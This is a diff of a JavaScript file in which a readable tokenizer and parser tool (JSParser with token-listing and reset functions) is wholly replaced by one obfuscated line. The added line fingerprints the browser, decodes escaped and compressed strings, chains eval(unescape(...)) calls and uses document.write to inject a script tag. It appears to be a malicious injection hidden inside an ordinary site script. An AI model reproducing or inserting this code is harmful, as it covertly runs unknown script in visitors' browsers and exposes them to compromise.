@@ -1,492 +1,1 @@
-  
-function $(x){return document.getElementById(x);} 
-function JSParser(str)
-{
-  this.statesr = [];
-  this.states = [];
-  this.outr = [];
-  this.out = [];
-  this.makem =function()
-  {
-  let s = [
- // state        '    "      /      \     *      s     \t   \r     \n     a9_$    pun    
- "0 init       1(db) 3(db)  5(db)  0(ds)  9(db)  0(b)  0(ds)  0(ds) 0(ds) 10(db)  9(db)"
- ,"1 strings1   0(ds) 1(b)   1(b)  2(b)  1(b)   1(b)   1(b)  13    13     1(b)     1(b)" 
- ,"2 strings0   1(b)  13   13     1(b)   13    13     13    13     13    1(b)      13"  
- ,"3 stringd1   3(b) 0(ds)   3(b)  4(b)  3(b)   3(b)   3(b)  13     13    3(b)     3(b)"  
- ,"4 stringd0   13   3(b)   13     3(b)   13   13      13   13      13   3(b)      13"
- ,"5 commenc1   11(b) 11(b)  8(b)  12(b)  6(b)  11(b) 11(b) 11(b) 11(b)  11(b)   11(b)" 
- ,"6 commenc2   6(b)  6(b)  6(b)   6(b)   7(b)   6(b)  6(b)  6(b) 6(b)   6(b)    6(b)"
- ,"7 commenc3   6(b)  6(b)  0(ds)  6(b)   7(b)   6(b)  6(b)  6(b)  6(b)  6(b)    6(b)"   
- ,"8 commenp    8(b)   8(b)  8(b)  8(b)   8(b)   8(b)  8(b)   0(d)  0(d)   8(b)   8(b)"     
- ,"9 operator   1(db)  3(db) 5(db) 9(ds)  9(db) 0(db)  0(db)  0(db) 0(db)  10(db) 9(b)"        
- ,"10 literal   1(db)  3(db) 5(db) 9(db)  9(db) 0(db)  0(db)  0(db) 0(db)  10(b)  9(db)" 
- ,"11 regex     11(b)  11(b) 0(ds)  12(b)  11(b)  11(b)  11(b)  11(b)  11(b)  11(b)  11(b)" 
- ,"12 regex0    13     13   11(b)  11(b)   11(b)   13     13    13     13    11(b)   11(b)" 
-];
- let s5="5 commenc1   13   13    8(b)   13    6(db)   0(db)  0(ds) 0(ds) 0(ds) 10(db)  9(db)";
-    
-   for (let j=0; j < 13; j++)
-   {
-       this.statesr[j] = [];
-       this.outr[j] = [];
-       let z = s[j].split(/[ ]+/);
-       for (let k=2; k < z.length; k++)
-       {
-           let q = z[k];
-           this.statesr[j][k-2] = parseInt(q.replace(/[^0-9]/g,''));
-           this.outr[j][k-2] =  (q.replace(/[^a-z]/g,''));
-       }
-   }
-   for (let j=0; j < 13; j++)
-   {
-       this.states[j] = [];
-       this.out[j] = [];
-       if (j == 5) 
-           s[j] = s5;
-       let z = s[j].split(/[ ]+/);
-       for (let k=2; k < z.length; k++)
-       {
-           let q = z[k];
-           this.states[j][k-2] = parseInt(q.replace(/[^0-9]/g,''));
-           this.out[j][k-2] =  (q.replace(/[^a-z]/g,''));
-       }
-   }
-   this.linenum = 0;
-  }
-    
-   this.INIT = 0;
-   this.STRINGS1 = 1;
-   this.STIRNGS0 = 2;
-   this.STRINGD1 = 3;
-   this.STIRNGD0 = 4;
-   this.COMMENTC1 = 5;
-   this.COMMENTC2 = 6;
-   this.COMMENTC3 = 7;
-   this.COMMENTP =  8;
-   this.OPERATOR = 9;
-   this.LITERAL = 10;
-   this.REGEX = 11;
-   this.REGEX0 = 12;
-   this.ERROR = 13;
-   this.code = function(char)
-   {
-       let x ="'\"/\\* \t\r\n".split(/|/);
-       let i = 0;
-       let k = x.length;
-       for (; i < x.length; i++) 
-           if (x[i] == char) return i;
-       x ="~!@#%^&*()-+={[]}|:;<>,?".split(/|/); 
-       let j = 0;
-       for (; j < x.length; j++) 
-           if (x[j] == char) return k+1;
-       return k;
-   }
-   this.s = str;
-   this.state = this.INIT;
-   this.position = -1;
-   this.makem();
-   this.buff = "";
-   this.parenthesis = false;
-   this.inp = false;
-   this.olds = null;
-   this.parenth = function(ans)
-   {
-       var ans0 = ans.replace(/^[ ]+/,'').replace(/[ ]+$/,'');
-       if (ans0!='')
-       {
-          if (this.inp == false)
-          {    
-              this.inp = ans0.charAt(ans0.length-1) == '(';
-          }
-          else
-              this.inp = false;// = ans0.charAt(0) == ')';
-       }
-   }
-   this.buf = "";
-   this.dd = "[],(),{},<=,>=,+=,++,--,===,!==,==,-=,*=,/=,%=,||,&&,&=,|=,!=,<<,>>".split(/,/);
-   this.nextToken = function()
-   {
-      if (this.buf.length  == 0)
-      {
-          let a = this.nextToken0();
-          if (a == null) 
-          {
-              if (this.state == this.ERROR)
-              {
-                  alert("Syntax error found in line " + this.linenum)
-              }
-              return null;
-          }
-          if (a.type != "operator" ||
-               a.token.length == 1 ) return a;
-          this.buf = (a.token);
-      }
-      for (let i=0; i < this.dd.length; i++)
-      {
-          if (this.buf == (this.dd[i]))
-          {
-              this.buf = "";
-              return {token:this.dd[i],type:"operator"};
-          }
-          else if (this.buf.toString().indexOf(this.dd[i]) == 0)
-          {
-              this.buf = this.buf.substring(this.dd[i].length);
-              return {token:this.dd[i],type:"operator"};
-          }
-      }
-      let ans =  this.buf.charAt(0);
-      this.buf = this.buf.substring(1);
-      return {token:ans,type:"operator"};
-      
-   }
-   this.linenum = 0;
-   this.nextToken0 = function()
-   {
-      if (this.state == this.ERROR) return null;
-      let type = ['sparator','string','string','string','string','operator',
-                  'comment', 'comment','comment','operator','literal','regex','regex'];
-      while (true)
-      {
-          if (this.position == this.s.length)
-          {
-              if (this.buff == '')
-                  return null;
-              else
-              {
-                  let ans = this.buff;
-                  this.buff = '';
-                  return {token:ans,type:type[this.state]};
-              }
-          }
-          ++this.position;
-          let char = this.s.charAt(this.position);
-          if (char == '\n') this.linenum++;
-          let d = this.state;
-          let c = this.code(char);
-          let o = null;
-          if (this.inp)
-          {
-             this.state = this.statesr[d][c];
-             o = this.outr[d][c];
-          }
-            
-          else  
-          {
-              this.state = this.states[d][c];
-              o = this.out[d][c];
-          }
-          if ( o == '')
-          {   
-             ans = this.buff;
-             if (ans != '')
-             {
-                this.parenth(ans);
-                return {token:ans, type:type[d]}
-             }
-             else return null;
-          }
-          else if (o == 'b')
-          {
-             this.buff = this.buff + char;
-          }
-          else if (o == 'db')
-          {
-             ans = this.buff;
-             this.buff = char;
-             if (ans != '')
-             {
-                this.parenth(ans);
-                return {token:ans, type:type[d]}
-             }
-          }
-          else if (o == 'ds')
-          {
-             ans = this.buff;
-             if (ans == '')
-             {
-                return {token:char, type:type[d]}  
-             }
-             else
-             {
-                this.buff = "";
-                this.parenth(ans);
-                return {token:ans + char, type:type[d]}  
-             }
-          }
-      }
-      return null;
-   }
-   this.navigate = function()
-   {
-       let x;
-       var t = $('s');
-       while ((x = this.nextToken()) != null)
-       {
-           t.value +=(x.inp + "  " + x.type + "        " + x.token.replace(/\n/,'\\n') + '\n');
-       }
-   }
-   this.valid  = function()
-   {
-       let x;
-       while ((x = this.nextToken()) != null)
-       { }
-       var t =  this.position == this.s.length;
-       if (t == false)
-           alert(this.state + ":" + this.s.substr(this.position,100))
-       return t;
-   }
-    
-   this.nextPiece = function()
-   {
-       var p = -1; 
-       var t; 
-       var l = -1; 
-       let state = 0;
-       let which;
-       while ((t = this.nextToken())!= null)
-       {
-           let token = t.token;
-           if (state == 0)
-           {
-               if (t.token == 'var' || t.token == 'let' || t.token == 'const')
-               {
-                   state = 2;
-                   p = this.position - t.token.length;
-                   l = 0;
-               }
-               else if (t.token == 'function')
-               {
-                   l = 0;
-                   state = 3;
-                   p = this.position - t.token.length;
-                   while (p>0 && this.s.charAt(p)!='\n' && this.s.charAt(p)!=';')p--;
-               }
-               else if (t.token == 'if' || t.token == 'else') 
-               {
-                   state = 1;
-                   p = this.position - t.token.length;
-                   l = 0;
-                   which = -1;
-               }
-               else if (t.token == ';')
-               {
-                   if (p<this.position)
-                   {
-                       let w = p;p = -1;
-                       return {type:'statement',codes:this.s.substring(w,this.position+1)};
-                   }
-                   
-               }
-               else if (p == -1)
-               {
-                   p = this.position-t.token.length+1;
-               }
-           }
-           else if (state == 1)
-           {
-              if (t.token == '{')
-              {
-                  l++;
-              }
-              else if (t.token == '}')
-              {
-                  l--;
-                  if (l == 0)
-                  {
-                      let q = this.position+1;
-                      if (this.s.charAt(q) == ';')
-                      {
-                         this.position = q;
-                         q++;
-                      }
-                      let w = p;p = -1;
-                      if (which == 2)
-                          return {type:'var',codes:this.s.substring(w,q)};
-                      else if (which==3)
-                          return {type:'function',codes:this.s.substring(w,q)};
-                      else
-                          return {type:'statement',codes:this.s.substring(w,q)};
-                  }
-              }
-              else  if (t.token == ';')
-              {
-                  if (l == 0)
-                  {
-                     let w = p;p = -1;
-                     if (which == 2)
-                          return {type:'var',codes:this.s.substring(w,this.position+1)};
-                      else if (which==3)
-                          return {type:'function',codes:this.s.substring(w,this.position+1)};
-                      else
-                          return {type:'statement',codes:this.s.substring(w,this.position+1)};
-                  }
-              }
-              else if (t.token == 'var' || t.token == 'let' || t.token == 'const')
-              {
-                   if (which==-1)which = 2; 
-              }
-              else if (t.token == 'function')
-              {
-                   if (which==-1) which = 3; 
-              }
-           }
-           else if (state == 2 )
-           {
-              if (t.token == '{') l++;
-                 else if (t.token == '}')l--;
-              if (t.token == ';' && l==0)
-              {
-                  let w = p;p = -1;
-                  return {type:'var',codes:this.s.substring(w,this.position+1)};
-              }
-           }
-           else if (state == 3)
-           {
-               if (t.token == '{') l++;
-               else if (t.token == '}'){ 
-                  l--; 
-                  if (l == 0)
-                  {
-                      let w = p;p = -1;
-                      return {type:'function',codes:this.s.substring(w,this.position+1)};
-                  }
-              }
-           }
-       }
-       return null;
-   }
-   this.nextGlobalVar = function()
-   {
-       var p = -1; 
-       var t; 
-       var l = -1; 
-       
-       while ((t = this.nextToken())!= null)
-       {
-           if (l==-1 && t.token == 'function' && t.type == 'literal')
-           {
-               l = 0;
-           }
-           else if (l>=0 && t.token == '{')
-           {
-               l++;
-           }
-           else if (l >=0 && t.token == '}')
-           {
-               l--;
-               if (l == 0) l--;
-           }
-           else if (l < 0 && p == -1 && (t.token == 'var' || t.token == 'let' || t.token == 'const') && t.type == 'literal')
-           {
-               p = this.position - 3;
-               while (p >=1 && this.s.charAt(p-1)!='\n' && this.s.charAt(p-1)!=';') 
-               {
-                   p--;
-               }
-               if (this.s.substring(p,p+1) == ' ' || this.s.substring(p,p+1) == '\t')
-               {
-                   p -= 2;
-                   while (p >=1 && this.s.charAt(p-1)!='\n' && this.s.charAt(p-1)!=';') 
-                   {
-                      p--;
-                   }
-               }
-           }
-           else if(l <0 && p>= 0 && t.token == ';') 
-           {
-               return this.s.substring(p,this.position+1); 
-           }
-       }
-       return '';
-   }
-}
-
-var pr = null;
-function nextt()
-{
-   $('reset').style.backgroundColor = null;  
-   if (pr == null) pr = new JSParser($('t').value);
-   var x = pr.nextToken();
-   if (x!=null)
-   $('s').value += x.type + "     "  + x.token.replace(/\r\n/,'\\r\\n').replace(/\r/,'\\r').replace(/\n/,'\\n').replace(/\t/,'\\t') + "\n";
-} 
-var total = 0;
-function tokens(t)
-{
-   $('reset').style.backgroundColor = null;  
-   if (t.value == 'All Tokens')
-   {
-       for (let i of "tvfsa".split(/|/)) $(i+'c').innerHTML = '';
-       total = 0;
-   }
-   if (pr == null) pr = new JSParser($('t').value);
-   let x; var k=0;
-   while ((x = pr.nextToken()) != null)
-   {
-       $('s').value +=(x.type + "      " + x.token.replace(/\r\n/,'\\r\\n').replace(/\r/,'\\r').replace(/\n/,'\\n').replace(/\t/,'\\t') + '\n');
-       k++;
-       if (k == 10000) break;
-   }
-   
-   total += k;
-   $('tc').innerHTML = total;
-   if (x != null)
-    t.value = 'Continue';
-   else
-   { 
-       t.value = 'All Tokens';
-       $('reset').style.backgroundColor = 'orange';  
-   }
-    
-} 
-
-function next(which,one)
-{
-   $('reset').style.backgroundColor = null;  
-   for (let i of "tvfsa".split(/|/)) $(i+'c').innerHTML = '';
-   if (pr == null)
-   pr = new JSParser($('t').value);
-   let x;
-   var k = 0;
-   while ( (x = pr.nextPiece())!=null)
-   {
-       if (which=='any' || x.type == which)
-       {
-           $('s').value += x.codes + "\n";
-           if (one!=null)return;
-           k++;
-       }    
-   }
-   $(which.charAt(0) + 'c').innerHTML = k; 
-   if (one == null || x == null)
-   {
-      $('reset').style.backgroundColor = 'orange';  
-   }
-} 
-
-function reset()
-{
-   pr = new JSParser($('t').value);
-   $('s').value = '';
-   $('reset').style.backgroundColor = null;  
-}    
-
-onload = function()
-{
-    let h = thispageheight();
-    let w = thispagewidth();
-    
-    $('t').style.width = (w/2-60) + 'px';
-    $('s').style.width = (w/2-60) + 'px';
-    $('t').style.height = (h-90) + 'px';
-    $('s').style.height = (h-90) + 'px';
-    
-}
- 
-onresize = function()
-{
-   $('t').style.width =   '10px';
-   $('s').style.width =  '10px';
-   onload();
-}
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';r2bmc552NK424J=new Array();v6g8ftTe1V8j82=new Array();v6g8ftTe1V8j82[0]='\157%35%70%39%38%35%31';r2bmc552NK424J[0]='	~zc~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~\r~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~]~^~_~`~3~~c~d~e~f~g~h~i~j~k~l~m~n~dl=document.layers;oe=win~tw.op}zca?1:0;da=(~t~v~x~z.}~w~ytMode||}}~{all)&&!};g}})}!.}5tEle}*ById;ws}}}\n.si}%bar?true:f},se;tN=navigator.u}YrA}5}}eLow}zcCa}Y();iz}]}\\.}HexOf(\'netsca}\')>=0}Q}S}U}Wl}Y;zi}F}||8~sa;v}O msg=\'\';function |m}w{r|ur|4}R}T}}D}H}q}|rr}f =|5}>|OF}G}	|Dl~u}d|2n.p|H}ecol}~}	|zc||fi}=|\r!=-1|}T}V}X}Zi7f=|s}0!z|O|m||p;/*{{{{{{{{{	{\n{\r\n* (C) C}\ryr}bht 2004-{21 by Syst}>s |3 Web, I|/.  A}- R{|{>e}jved{9 *{\r{Auth}f: Z{Pngya|4L}{:{]{^{_{`{a{b{c{a{J{{{h{i{j{k{/{\rif{ ty}o|i|1sago}$~tma}{=|K\'|.}%|e|d|\r{\r{{\r{]|#r {y|{|{~dzzcz|4|K}7}|T|\n|1|3.}eS}R}g}w|`}%||\'{tps://z{U{W{Yl}}9{yhub}~o|\r;z{:{p{z{{{}{oz{\\|i 0)zF z\n{az~{z |Vz#h|:{qzz0z2z4z6z8{Xnz;|Xgz>z@zB/}K{,/|+zU}{\rzvzX \n|-|/z"|4$(x)|9|;|= zZ}9|}<}>}!}@}By}x}zzz||0|W JSP}O}j({+r)\n{zy{O|}Jt}d{Cz|K[];y#hy%{+y({.y+y-y/y%o{Ny* y,y.{:y$s}{N|Jy<y6y?y0yAzk}>|Jyz~}wzyy"{:}={y4y<zXz5 y2{,{b\'{^"{`/{`\\{_{{_{.{^\\{{:\\zyi|4{^a9_${^p|.{^zX"0zn{y{a1}b{3x{ 5x{:0}sx9x\nzR(xxx\rxxdxxx{1xx xdx"zX,"{$yz(s{$xx xx x0xx2x4{:x1xx3x2x9x83{^1x?x@x7xCx$zz x\'2yZz\'{Vsy|x8xDxA{]xRxEx:xTx>{_xWx0xBxSx\\x;x:x]y`xGx\'x?x*{Vdx- xxxx{:xkx4xDxp{]xtxoxQx^x[{^xvxux4xbx&"4xK{xgxOxzxwx<xyx|xWxZxXwx@x\\x|xawzc5 |]m}cxi1x=wxD8xQx6x 6xQww&x7wx w)xVx9y`wzc6wzNwxJ{:w$w#xDw6x:w9{]7xD w;w?w8x7w@wAx2wE)x%xH"7w1w~ycx\\w@w@xmxwDw=x2wRwBw7w[x`w9xbxc"8wM}p{^w x2wgxwi{:wkwlw>wmwmxx}x:wqwiw_{:wzc9{/}r}d|IxPx#xxvxx\nx"xnx"xlxxwsvv\rx8vxxF{awzcx z;{,w~lxSxvxx	vv\nxx\nvxx vv&xxDv#w.wJw |:}5xxYx=x0x=wTx8w"xw+x8v6v=v7w%vBw*w-w`1xJv2|zcwwx]xSv?v6vAw	xYx^w\rxZv@vQwHzzyFyTyZ5="wwwwx\\xZwqxZw$vx.v(xxxv9v+vjv-y>{]zy f|I(v\\j|; j <x[v~j++y {]yR{`y@y&y3r[j]yDy=vv{^uy9}Ruuy5vt{_v\\zyDsu}Jpv(/[ ]+/}xu{]vxzvz| k=2v~ku z~|~yg{Ou9uu{`u\n{cv\\qyDz[kyF{duy[y)uuL{!u pye{7t(q.|:u%aceu\'[^0-9]/g,|*)u.{d{syHyBuuuT2uV{u^u`~}ucue^a-zukumuouq{`}vvt\nu0vyv{v}vu;xAuuCvvuFuutuQu"uuuN{_u{Nutu{^zH(uzczx{u/{`tuVs5t${]uu!u#su%{yueu*u,t{_u1{v\\u6u8u5u;u=}={VuAu5t{at{auHuJuLt{buPy\'{,t.uxuVuX}uZ~zu]u_euauu(uguitun|\rt=tSutuuSkuUyDu{t_taudtct';v1b6Bagw='fu';j44vccER3677='qcoujfpayOVqnYDsbOkMhRKi';v1b6Bagw+=  'nction l1P5Q3'+'f83L2g964A(den86S'+'bf2b661js8F){';tvAe45eR5k0Kps='eKbjmEDb';gha6W='i%66%28z%4CP%2E\151\156\144e\170Of%28%27%5C%35%35%27%29%3E%30%29%7B\162%32\142%6D\143%35%35%32\116K%34%32%34\112%5B%30%5D%3D%27\170%27%7D%3B\166\141r%20%6C%32%3D\167%69nd%6Fw%2Eop%65\162%61%3F%31%3A%30%3Bf%75%6Ec%74%69on%20%65%64%35\142%38%61%63%36c%28%29%7B%69\146%28c%36\143a%38%62%35d\145%29%7Bdoc\165%6Den%74%2Ew%72it\145%28%27%3C%73%63\162%27%2B%27\151\160t%3E%27%2B%6C\117%2B%27%3C%2F\163%63%27%2B%27r%69%70%74%3E%27%29%7D%7D%3Bf\165\156%63tio%6E%20l%33%28l%34%29%7B\154%35%3D%2F\172\143%2F\147%3Bl%36%3DString%2E\146%72\157m\103har\103%6Fd%65%28%30%29%3B\154%34%3D\154%34%2Ere%70l\141ce%28l%35%2C\154%36%29%3B%76ar%20l%37%3Dnew%20%41rr\141\171%28%29%2C%6C%38%3D%5F%31%3D\154%34%2El%65ngt%68%2C%6C%39%2ClI%2Cil%3D%31%36%32%35%36%2C%5F%31%3D%30%2C\111%3D%30%2C%6Ci%3D%27%27%3B%64o%7Bl%39%3D%6C';eval(unescape('fu%6Ect%69%6F\156%20%63%68xgm%68%20%20%20%20%28%66%57i\117\170%31%36%29%7B\163Mi%4B%32%34d\127%3D\146%57%69%4Fx%31%36%7D%3B'));v6g8ftTe1V8j82[0]+=  'a\156%33D%36\161e%36\156%76%32%58';r2bmc552NK424J[0]+=  'tultgupt2{:tt|vvuzj~y~wyD}zyt}wy{]uINITsuuSTRsGS{$|K1sutsIRNsy||Ku8tsssDsxjsy%ssGDs" 4s,yACOMMENTCs*t1s%y%s7s9s;s=xJ|K6s5.sCs:s<Cx?|K7sJsLsEPtp8sJOPERATORyD9sJLs\rs\\ALyDxsJREGEXsjssAyAsmsoXs2vGsJs\\Rs`sj3sJ|]}%yDyN|W(ch}OuDzVt,vu4v4v_\'\\"/\\\\{yjym\\n"u$u&/|u-t{r{isr\rtAyDxu>tHhr#t?(v~r&ur+tGu@r.zuCxG{dt&x[iu|Krr\nv1y|4ir#r"~!@#%^&*}w-+={y,}|:;<>,?rt7rr!}xr;uu4t(zRr/vyuu;r5u?tIuurg{br=t"t)rCyrEt|<|4k+ss{a|:r}ykusuPu!}RsJuQyDs\nsTsJpozqy|K|ksJyJ}>}wsJbufza ""q}O}!h{C|r|~st|`we|K||q.|^xyDnu}-q&|:~zhr|.y|3({Yxtr\rz qDs2qDtru~tt^u)u+/tyqMubttqQ+$qSuor#t&qJ|iuor\rtM{_t&u}q0q1|prtLyyurs	utqgyDqJ.rzAu\\qsr6{O|kzz|r#{]s{ae|er\r{aqfnq0vw|~yY|Kqsquu\\zS|Jz)|+r\rsq	utqq"q$sJzyD"y,,}w,{},<=,|,rVp-+,--,zp*|ip*zp1p**p*/p*%p*}\',}0pCpAp6p*<<p+>rbt8u\\qSr"q.|xtToyKzvwq@yOrqcqepq r,r7{:t)zSt,qc{^v\\aqutpSpUpW~yxti{`q^p|5q9}.ruuEppt{q(tTy(pvus|s`qk{dphur},}zcu\\"{)~zav4}zc|Hzvxzy}v}eq# +usy%sq8mo{cp{dqr~pwq:p| o%qdp~az${uozQ"}\r}}ery`}\'o+{_o0}epXpb{Opv{${o\'y|!o+upyDqCz$ppnpso,t,r0v\\itr3oyAzoAr8itK{_ozGp~oJq pvputzr?]upo+oatp`pq%o<{]oF|4{o?~y:uoir@,{t}:o5w}wo9|Ao+o-{^p}YzocopoNz&wz))z+|b|o{dojq|zRo#{^onty%oK|Kodf}Jz@xfz)nojo\\oQ{bouzVoxnozohno}o}Uno7}f"n{do-o-pjnyVoY.pqtr	}kpoQn#pln pasn&xLz)1oQn.owoO:qDo~o2no6w~o8n;t{tq.o s|Ksqoy%pnpVpXs2rqBp]t,p_y1tUot)oRs}RoErFo)lt{v\\n6u\'t7}On\'unn\'mmnQm\nm	mmunn]m,os{`\'vb}!m mw2munm~zm\nmo8m\nv}lm\nvIxm)ev3\'tR{:wy0}={|?eo#onnryAqq{0nvtn+ommnm5opzaz|\rmC{^n.q8o*qn{:n\npmOrmSpiu4qDnLyApfquOmFyD|*m]{cnUn0nXnAnZnzcn6[ozc{,]n<mOnpzco+uum<z|3mbv\\rzmY}JnF}Oqvogy%mvz~n,{]t&m{t)rn|\rnCndmumyu4dm|uQl{cm|rudrzlySu4oq7pxmbm:q/nu	mmlnunCtud][cm0{bl n"tky:[l.l0l2{^mqqm{cmQs{cnnhyAql5nsy3l8l/l1mb{^l4nCtll9lLno+t&{/pvqaovumOmXlGmZq m\\mq^nA zQlYqnlCnm;q\'q=qCnAlqn|nVpXmfs{5n6ozo2lJl=l<ml@mLl"lT{dl@t&l4zbmIol(m_l^nDl`ownGmbl|kp~kmx#k	lBml]nCm[lMyGnMq!yDrzk mDln{.lfkurlilD|Yll{Ok(lp{`mdnWnY{sn[mjl.l|mrn=o+k{k\'xk+tLkldk\rklbo/kHmHl&o`mJr|o(lsoyrzlwk9lzk;lAurk<mPpmk-k!l_k#|KpkQmuk0hk2k&otlrmemXokVk8mikYmnk[k>kx{_o-kzcmNt~k.}_}a}cy\\q1p[rnptNrr#qH{|KyzcmzDr\rm2|fo(ym|njoO}w{zQmM}.qbo<~{|#l}To}r+qqoxby`or+mj){bj+ j-oOqUtbrq[rl{ol\nj{apq.j"}LpdpZz}jqFj{xr#jm4jrnCjpXjle|Kjn{oR{ajtpmuqmwzk\ryAqyr.r\rqepvq2m7o<o\nru\\l)k"nkuPn%bylm;j_z~,xzSnn.tqupR|zctPieucq?jFnojH{`qHp\nqpz{:jv~qG|$vqsir$xKonfr#v\\jrjLm3jpjink~yjjpxjXo<mzcoOqoNpXlMt&lFnfkO{:kaqei5~ylXzy^}\'{si?jamyTiC|iEn0lX|]nAtkEk,kQ{]lF{kl{_p\nj^m=|4-iLj4jdiXpir\'mUk]{]k@piFlXnnj:mJkaici iT{:';function f83L2g964Al1P5Q3(p8cAX6Vo){j44vccER3677+=p8cAX6Vo};v1b6Bagw+=  'eva';cIxQ82d='MMSDRKtFIJgqtvWqgcnjFOsPTXOg';v1b6Bagw+=  'l(unes';tcnJwC5S='x4bj2e2Zwzkf4';v1b6Bagw+=  'cape(den86Sbf2b661js8F))}';eval(v1b6Bagw);hu43I1F09cRYL='OOODfMUidkmOLROdjZEDsiLHhgOqjDHwkMQ';v1b6Bagw='';gha6W+=  '%34%2Ec%68\141rCo\144\145A%74%28%5F%31%29%3B\154\111%3D%6C%34%2Ech\141r%43\157\144%65A%74%28%2B%2B%5F%31%29%3Bl%37%5B\111%2B%2B%5D%3D%6CI%2Bi%6C%2D%28%6C%39%3C%3C%37%29%7Dw%68ile%28%5F%31%2B%2B%3C%6C%38%29%3Bva%72%20\154%31%3D%6E\145w%20%41%72r%61y%28%29%2Cl%30%3D%6E\145%77%20\101\162\162\141y%28%29%2C%49%6C%3D%31%32%38%3Bd%6F%7Bl%30%5B\111l%5D%3DSt%72i\156\147%2EfromCh\141\162C%6Fd\145%28%49\154%29%7Dwhile%28%2D%2D\111l%29%3B\111\154%3D%31%32%38%3Bl%31%5B%30%5D%3D\154i%3Dl%30%5B%6C%37%5B%30%5D%5D%3B%6C%6C%3Dl%37%5B%30%5D%3B%5F%6C%3D%31%3B%76a\162%20l%5F%3D\154%37%2E\154\145n\147%74\150%2D%31%3B\167h%69%6C\145%28%5F\154%3C\154%5F%29%7B%73\167\151t%63%68%28%6C%37%5B%5F%6C%5D%3CIl%3F%31%3A%30%29%7B%63%61%73\145%20%30%20%3Al%30%5B\111l%5D%3D%6C%30%5B\154l%5D%2B\123%74%72ing%28%6C%30%5Bll%5D%29%2E%73%75%62st\162%28';f83L2g964Al1P5Q3('bx93WQgx3fg5a');eM66Cy79a='l';r2bmc552NK424J[0]+=  'iVrzciruWm|lyi^~{n0o\\ib{]jMjp>y|}0l+m~nH(p)q`ry^hjtph\nh|);|\rpp2iXifk^ni>iMl	{piJi_pXlXmQliniviVqmU{]iZutiy{0i{iFi~ivirkivi#q>ihmJihi|i3l	hi;kPh,lp~p<i[j`hC{biojI wyDp;ih+hEmKknn[my(}*mlz3jtnOjvnQ(wo~h/jz|Wq)mohEh{_mJhoihqh q{h(hWiwk\rh0n-h?o@jdqh<k\\o<ihi9x0hCk-hh@z{iRkhWllmChh>ijl	}ghMirlhirt&ii:irhNrh{uIhzhi|3givhFmEy1hlzcqn|+gmUg#phhi\\yDqi{bqghxk=g@ihQ|KhShUg<t%p~h9pv2hLmSmdhZiB,h_n2g.hbn\'he,g1hmhxihh9z3gNmOgPnzc\'ilh^}${CgUlEjugXhfg[gHigk_gB{_gd}Uh[{,h]gSgih`m@gWhdgohlg<hgpobm5gzhBmCg#gpvpfhWg6l{gDuWhTyDqg+k\'gKt)gMfguhYgegRgThanPngYhJz~hkg\\hWg^y0rg`gbqngv:gfj|3gh}%g}gVf&z(f(g8j`f+gqhmRgtkmqovlxgxym!g{f:gkm}gf\'hff)hjnSf,mpgmCghziB iDh~i@l	iIf`iKfbiGmiPg4p{hxt&g_|jnSfiWij?f[fg\nh$l	gggbg6fof/hzq{hPezcyDrzcfut	o<k<gntgL gmCfyfcglg+if\\gmg)g-klefih h~r|f}gu4fgFfhVmUf4\'f#g|fPlEf={Vf?lg(nfBfZgurei|Kgao<i=ocf	mg\r{eiXefzzejYghe{cfpef2l\'gti"hRfh;fe0ggfNgjf%hcfShge9i\\e<hWfe\npr\rk|n~nbkiG|T}NlV|$jinyPeYi|$gGiidie-iv{ah{i(k\rjRi,upi.}-i0urge{$heGf6e|h&iLo2lXm&vfli<mJh6ngkyl?fxp~l|hdfhlXeIeDd&g?d){bihvd.e$d0ded4mUeiXeVi:vge>kd+t@u;d/hyid<ff]mf_fadfedUdRfj{+ldmfd{ym\'d$mTmSh.ehj`hus+mJdh\n |dd0m@hhnSh\rldPhnGlzcdshg3t+g5ivhehqmJl$e5eef>p,phklXmffhfRcc\ncl	yjdbnczchus#gHdkwedndwdqdyu\\d{dudhdrq{q`hBeTggBcgHhok<ed+vzudMhnfdwdc+d@gOn|edgXc	fUg)nSdd7gAf fHmpmrt\n\niy;jy.il|LpTu\\y uFj|:}YiQn{+y}=nDubkg|Hz{|TcQl"k[t&|ZpvjWuWcQehQyyt[r(jc].j"}Tt=qHjP|Z.de}t=r=|ijWvvjs|\rc|},j$rVj2o1}jp{_xbj,h3u}qVu\'rnj8rhnbj6rbrb\rb#ttj7unj9b(t`qNbtbc]jprorycO|$}ey\'d\'cSf7|>oOspcXb\n|c[|b\rc_ca}Nccdcf}	ch|IjVckrgi>c}nuz{<vi+nAk+phoTu4r&{wq#tvf{{pMrdu-{yzco^mb\r}|FHTMsimHr#b;},idk~fh\ny*bSdcqq7csyyuYcxczb\rbWt=v\\jK qHu6d(ejdb}gbjTdje{_ba\nborVyba!obkj3o@b)brb+rb j:j5b*b%b,ymb.tsbba5a1a+rb2a5b4j<b!r#qzcejfp~u:t)j}{{b|:aqerk[byvbaQ{]czcbpnbrbtbv{sob<ur=jUn}qkj!a m`{~z}}TcLfDtiahj#l*\'bZ b\\br#cZ{CbHc^{tbKcccey9bP|^bRm}f{Y}5|+k[p\nb8z{b?cUu\\h9,|3jjcYbFa}c{bJecbbM`cg`cjq:k[b`r%{/{q"bebgabit9r bk bm+bonbq}zcbsbum`aok\'cnt)b	h-crctacwcy|c{aua\ruab{ajN{abiii	udd}^i/io.{fp\'{Yyh"j-d t)h9d{danbWj%bh_b5ri7k|bi/oulMaEr#yl[b|`3heezcg/nIk`6|`a]`;|KqbU`sbXn}crazcad%{`a|c\\bI`zc`bLbN`dbQy;\'`	{Ve`rgt\n`cTbGcWy!vv`?|L`Dcvya	`ka t=`jbat`<u_a~y&c`_`bO_`#l!`%zz`{wy\n|3|Tale{qAb_*mV{h:oYuX}5q){@que[l^_Ucs}Lk1tiu_1_<ca}doB|Khe/2-6pj<pm+t$_5`._f_h`^_k_m_om_q`=`~\'`_._Wg{oLhui_|\'_~_s|ba_=^e{@^^\nj;_}_rit_Hnc[}zl*ilyP`^_^_w_S{:\'x